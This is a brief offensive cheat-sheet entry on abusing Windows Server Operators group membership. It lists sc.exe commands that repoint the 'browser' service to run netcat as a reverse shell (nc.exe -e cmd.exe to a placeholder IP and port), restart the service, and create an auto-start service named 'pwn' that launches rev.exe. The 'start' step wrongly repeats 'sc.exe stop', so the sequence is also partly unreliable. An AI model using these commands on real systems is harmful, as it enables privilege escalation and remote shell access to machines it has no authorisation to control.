item.title: Server Operators
item.description: Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>" # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto
